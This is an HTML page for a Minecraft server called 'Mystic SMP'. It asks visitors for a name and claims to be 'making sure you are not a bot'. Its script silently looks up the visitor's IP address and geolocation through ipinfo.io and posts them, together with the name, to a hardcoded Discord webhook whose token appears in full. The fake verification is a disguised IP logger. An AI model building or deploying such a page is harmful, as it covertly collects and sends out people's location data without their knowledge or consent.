<!DOCTYPE html>
<html>
<head>
  <title>MYSTIC SMP</title>
  <style>
    #mainPage, #welcomePage {
      display: none;
    }
    #mainPage {
      display: block;
    }
  </style>
</head>
<body>
  <!-- Page 1: Name + IP collection -->
  <div id="mainPage">
    <h2>Welcome!</h2>
    <p>what do we call you?</p>
    <input type="text" id="nameInput" placeholder="Your name" />
    <button id="submitBtn">Submit</button>
    <p id="status"></p>
  </div>

  <!-- Page 2: Mystic Website content -->
  <div id="welcomePage">
    <h1>Welcome to Mystic SMP!</h1>
    <p>You’ve been verified. Enjoy exploring our server and community.</p>
    <!-- Add more content here -->
  </div>

  <script>
    const webhookURL = "https://discord.com/api/webhooks/1389939874454442044/xzwnU8-Y6OmJzrBIPkApuOjRPEq1uURdEQcWcJS-tTlxRpxRJTEq4VlxmSP-XI0aYRFW";

    document.getElementById("submitBtn").addEventListener("click", () => {
      const name = document.getElementById("nameInput").value.trim();
      if (!name) {
        alert("what do we call you?");
        return;
      }

      document.getElementById("status").textContent = "making sure you are not a bot";

      fetch("https://ipinfo.io/json")
        .then(res => res.json())
        .then(ipData => {
          const coords = ipData.loc ? ipData.loc.split(",") : ["Unknown", "Unknown"];
          const latitude = coords[0];
          const longitude = coords[1];

          const message = {
            content: `👤 Visitor Name: **${name}**\n` +
                     `🌐 IP: ${ipData.ip}\n` +
                     `🏙️ City: ${ipData.city}\n` +
                     `🌍 Region: ${ipData.region}\n` +
                     `🇺🇸 Country: ${ipData.country}\n` +
                     `📍 Coordinates: Latitude ${latitude}, Longitude ${longitude}`
          };

          fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(message)
          }).then(() => {
            document.getElementById("status").textContent = "all good!";
            // Redirect to second section after short delay
            setTimeout(() => {
              document.getElementById("mainPage").style.display = "none";
              document.getElementById("welcomePage").style.display = "block";
            }, 2000);
          }).catch(err => {
            document.getElementById("status").textContent = "YOU AREE A BOT!";
            console.error("Discord webhook error:", err);
          });
        })
        .catch(err => {
          document.getElementById("status").textContent = "YOU AREE A BOT!";
          console.error("IP info error:", err);
        });
    });
  </script>
</body>
</html>
